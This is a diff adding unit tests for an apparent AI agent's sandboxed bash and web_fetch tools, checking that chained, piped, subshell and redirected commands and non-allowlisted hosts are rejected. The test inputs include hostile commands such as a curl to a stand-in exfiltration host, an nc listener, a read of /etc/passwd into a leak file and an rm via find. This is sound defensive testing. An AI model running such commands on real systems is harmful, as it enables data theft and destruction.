@@ -387,6 +387,77 @@ def test_run_streaming_final_clean_when_refs_real(monkeypatch):
     assert out["broken_refs"] == []
 
 
+# ── 7b. Hardened bash + web_fetch gates ───────────────────────────────────
+
+def test_bash_blocks_chained_command_injection():
+    """`ls && curl evil.com` must be rejected — first-token whitelist alone
+    is bypassable, so we also reject any shell metacharacters."""
+    from agents.generalist import _t_bash
+    r = _t_bash("ls && curl http://evil.example/exfil")
+    assert r.startswith("ERROR:PERMISSION:")
+    assert "metacharacter" in r.lower()
+
+
+def test_bash_blocks_pipe_chain():
+    from agents.generalist import _t_bash
+    r = _t_bash("ls | nc -l 4444")
+    assert r.startswith("ERROR:PERMISSION:")
+
+
+def test_bash_blocks_subshell_substitution():
+    from agents.generalist import _t_bash
+    r = _t_bash("echo $(curl http://evil.example)")
+    assert r.startswith("ERROR:PERMISSION:")
+
+
+def test_bash_blocks_redirection():
+    from agents.generalist import _t_bash
+    r = _t_bash("cat /etc/passwd > /tmp/leak")
+    assert r.startswith("ERROR:PERMISSION:")
+
+
+def test_bash_blocks_dangerous_token_as_argument():
+    """`find . -exec rm {} \\;` is fatal; rm in args is detected."""
+    from agents.generalist import _t_bash
+    # No metachars in this version, but `rm` appears as token →
+    # blocked by token deny-list.
+    r = _t_bash("find . -name foo -exec rm")
+    assert r.startswith("ERROR:PERMISSION:")
+    assert "rm" in r
+
+
+def test_bash_allows_simple_whitelisted_command():
+    """`ls -la` should pass and execute (just uses /tmp to avoid side effects)."""
+    from agents.generalist import _t_bash
+    r = _t_bash("echo hello-aim")
+    assert not r.startswith("ERROR:")
+    assert "hello-aim" in r
+
+
+def test_web_fetch_blocks_unknown_host():
+    from agents.generalist import _t_web_fetch
+    r = _t_web_fetch("https://evil.example.com/payload")
+    assert r.startswith("ERROR:PERMISSION:")
+    assert "evil.example.com" in r
+
+
+def test_web_fetch_allowlist_via_env(monkeypatch):
+    """AIM_WEB_FETCH_ALLOW env extends the default allowlist."""
+    monkeypatch.setenv("AIM_WEB_FETCH_ALLOW", "my-corp.example,foo.example.com")
+    from agents.generalist import _web_fetch_host_allowed
+    ok, host = _web_fetch_host_allowed("https://my-corp.example/page")
+    assert ok
+    # Subdomain match works
+    ok2, host2 = _web_fetch_host_allowed("https://api.foo.example.com/p")
+    assert ok2
+
+
+def test_web_fetch_default_allows_pubmed():
+    from agents.generalist import _web_fetch_host_allowed
+    ok, _ = _web_fetch_host_allowed("https://pubmed.ncbi.nlm.nih.gov/12345/")
+    assert ok
+
+
 # ── 8. AST verify (semantic checks beyond regex) ─────────────────────────
 
 def test_ast_def_at_finds_function():
